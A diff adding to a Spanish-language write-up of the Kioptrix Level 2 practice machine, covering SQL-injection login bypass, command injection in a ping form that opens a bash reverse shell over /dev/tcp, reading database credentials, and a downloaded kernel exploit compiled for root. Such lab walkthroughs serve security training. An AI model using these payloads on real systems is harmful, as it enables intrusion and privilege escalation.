@@ -336,3 +336,206 @@ root@TigerTeam:~/Kioptrixl2# curl -s -v -d "uname=admin&psw=test2'+or'1'='1" -X 
 * Closing connection 0
 
 ```
+
+Despues se generó un petición HTTP donde se añadieron valores en los parametros del formulario y se identificó que la aplicación realizá peticiones ICMP mediante el comando **ping**.
+```
+root@TigerTeam:~/Kioptrixl2# curl -s -v -d "ip=192.168.1.186&submit=submit" -X POST http://192.168.1.187/pingit.php 
+* Expire in 0 ms for 6 (transfer 0x556476f16dd0)
+*   Trying 192.168.1.187...
+* TCP_NODELAY set
+* Expire in 200 ms for 4 (transfer 0x556476f16dd0)
+* Connected to 192.168.1.187 (192.168.1.187) port 80 (#0)
+> POST /pingit.php HTTP/1.1
+> Host: 192.168.1.187
+> User-Agent: curl/7.64.0
+> Accept: */*
+> Content-Length: 30
+> Content-Type: application/x-www-form-urlencoded
+> 
+* upload completely sent off: 30 out of 30 bytes
+< HTTP/1.1 200 OK
+< Date: Thu, 11 Jul 2019 20:25:16 GMT
+< Server: Apache/2.0.52 (CentOS)
+< X-Powered-By: PHP/4.3.9
+< Content-Length: 424
+< Connection: close
+< Content-Type: text/html; charset=UTF-8
+< 
+192.168.1.186<pre>PING 192.168.1.186 (192.168.1.186) 56(84) bytes of data.
+64 bytes from 192.168.1.186: icmp_seq=0 ttl=64 time=0.256 ms
+64 bytes from 192.168.1.186: icmp_seq=1 ttl=64 time=0.396 ms
+64 bytes from 192.168.1.186: icmp_seq=2 ttl=64 time=0.264 ms
+
+--- 192.168.1.186 ping statistics ---
+3 packets transmitted, 3 received, 0% packet loss, time 1999ms
+rtt min/avg/max/mdev = 0.256/0.305/0.396/0.065 ms, pipe 2
+* Closing connection 0
+</pre>root@TigerTeam:~/Kioptrixl2# 
+```
+
+
+Despues tambien se corroboró con la herramienta **tcpdump** que la aplicación envia el trafico ICMP.
+
+```
+tcpdump -i eth0 icmp
+10 IP TigerTeam.lan > 192.168.1.187: ICMP echo reply, id 30734, seq 0, length 64
+18:34:49.873468 IP 192.168.1.187 > TigerTeam.lan: ICMP echo request, id 30734, seq 1, length 64
+18:34:49.873509 IP TigerTeam.lan > 192.168.1.187: ICMP echo reply, id 30734, seq 1, length 64
+18:34:50.873744 IP 192.168.1.187 > TigerTeam.lan: ICMP echo request, id 30734, seq 2, length 64
+18:34:50.873813 IP TigerTeam.lan > 192.168.1.187: ICMP echo reply, id 30734, seq 2, length 64
+^C
+6 packets captured
+6 packets received by filter
+0 packets dropped by kernel
+```
+
+# Explotación
+
+Finalmente se realizó la inyección de comandos y se obtuvo una reverse shell.
+
+
+```
+root@TigerTeam:~/Kioptrixl2# curl -s -v -F ip='192.168.1.186 & bash -i >& /dev/tcp/192.168.1.186/4444 0>&1' -F submit=submit -X POST http://192.168.1.187/pingit.php 
+* Expire in 0 ms for 6 (transfer 0x55de654fadd0)
+*   Trying 192.168.1.187...
+* TCP_NODELAY set
+* Expire in 200 ms for 4 (transfer 0x55de654fadd0)
+* Connected to 192.168.1.187 (192.168.1.187) port 80 (#0)
+> POST /pingit.php HTTP/1.1
+> Host: 192.168.1.187
+> User-Agent: curl/7.64.0
+> Accept: */*
+> Content-Length: 297
+> Content-Type: multipart/form-data; boundary=------------------------dd87abe7d2f1e214
+
+```
+
+Se identificó que la interfaz de linea de comando obtenida, tiene privilegios limitados(**apache**).
+```
+root@TigerTeam:~# nc -lvp 4444
+listening on [any] 4444 ...
+192.168.1.187: inverse host lookup failed: Unknown host
+connect to [192.168.1.186] from (UNKNOWN) [192.168.1.187] 40753
+bash: no job control in this shell
+bash-3.00$ id
+uid=48(apache) gid=48(apache) groups=48(apache)
+bash-3.00$ /bin/bash -i
+bash: no job control in this shell
+bash-3.00$ /bin/sh -i
+sh: no job control in this shell
+sh-3.00$ uname -a
+Linux kioptrix.level2 2.6.9-55.EL #1 Wed May 2 13:52:16 EDT 2007 i686 i686 i386 GNU/Linux
+sh-3.00$ whoami
+apache
+sh-3.00$ 
+```
+
+Dentro del dispositivo, se identificó el usuario y contraseña de la conexión de la base de datos.
+
+```
+bash-3.00$ cat index.php
+<?php
+	mysql_connect("localhost", "john", "hiroshima") or die(mysql_error());
+	//print "Connected to MySQL<br />";
+	mysql_select_db("webapp");
+	
+	if ($_POST['uname'] != ""){
+		$username = $_POST['uname'];
+		$password = $_POST['psw'];
+		$query = "SELECT * FROM users WHERE username = '$username' AND password='$password'";
+		//print $query."<br>";
+		$result = mysql_query($query);
+
+		$row = mysql_fetch_array($result);
+		//print "ID: ".$row['id']."<br />";
+	}
+
+?>
+<html>
+<body>
+<?php
+
+[......]
+
+```
+
+Con el comando **lsb_release** se identificó la versión del sistema operativo, en este caso es **CentOS release 4.5**
+
+
+```
+bash-3.00$ lsb_release -a
+LSB Version:	:core-3.0-ia32:core-3.0-noarch:graphics-3.0-ia32:graphics-3.0-noarch
+Distributor ID:	CentOS
+Description:	CentOS release 4.5 (Final)
+Release:	4.5
+Codename:	Final
+bash-3.00$ 
+```
+
+Con el comando **searchploit** se identificó un exploit local.
+
+```
+root@TigerTeam:~# searchsploit CentOS 4.5
+------------------------------------------------------------------------------------------------------------- ----------------------------------------
+ Exploit Title                                                                                               |  Path
+                                                                                                             | (/usr/share/exploitdb/)
+------------------------------------------------------------------------------------------------------------- ----------------------------------------
+Linux Kernel 2.6 < 2.6.19 (White Box 4 / CentOS 4.4/4.5 / Fedora Core 4/5/6 x86) - 'ip_append_data()' Ring0  | exploits/linux_x86/local/9542.c
+Linux Kernel 3.14.5 (CentOS 7 / RHEL) - 'libfutex' Local Privilege Escalation                                | exploits/linux/local/35370.c
+------------------------------------------------------------------------------------------------------------- ----------------------------------------
+Shellcodes: No Result
+```
+
+
+Despues se realizó una copia del exploit **9542.c** hacia la maquina comprometida en la ruta **/tmp**
+
+```
+root@TigerTeam:~/Kioptrixl2# python -m SimpleHTTPServer 8000
+Serving HTTP on 0.0.0.0 port 8000 ...
+192.168.1.187 - - [18/Jul/2019 14:01:52] "GET /9542.c HTTP/1.0" 200 -
+```
+
+```
+bash-3.00$ pwd
+/tmp
+bash-3.00$ ls
+bash-3.00$ wget http://192.168.1.207:8000/9542.c
+--18:15:08--  http://192.168.1.207:8000/9542.c
+           => `9542.c'
+Connecting to 192.168.1.207:8000... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 2,643 (2.6K) [text/plain]
+
+    0K ..                                                    100%    2.95 MB/s
+
+18:15:08 (2.95 MB/s) - `9542.c' saved [2643/2643]
+
+bash-3.00$ ls -la
+total 24
+drwxr-xrwx   4 root   root   4096 Jul 11 18:15 .
+drwxr-xr-x  23 root   root   4096 Jul 11 15:22 ..
+-rw-r--r--   1 apache apache 2643 Jul 18  2019 9542.c
+drwxrwxrwt   2 root   root   4096 Jul 11 15:22 .font-unix
+drwxrwxrwt   2 root   root   4096 Jul 11 15:22 .ICE-unix
+bash-3.00$ 
+```
+
+Finalmente se compilo el exploit, y se tuvo una shell con privilegios de administración **root**.
+
+```
+bash-3.00$ gcc 9542.c -o 9542  
+9542.c:109:28: warning: no newline at end of file
+bash-3.00$ ls -la
+total 32
+drwxr-xrwx   4 root   root   4096 Jul 11 18:18 .
+drwxr-xr-x  23 root   root   4096 Jul 11 15:22 ..
+-rwxr-xr-x   1 apache apache 6932 Jul 11 18:18 9542
+-rw-r--r--   1 apache apache 2643 Jul 18  2019 9542.c
+drwxrwxrwt   2 root   root   4096 Jul 11 15:22 .font-unix
+drwxrwxrwt   2 root   root   4096 Jul 11 15:22 .ICE-unix
+bash-3.00$ ./9542
+sh: no job control in this shell
+sh-3.00# whoami
+root
+sh-3.00# 
+```
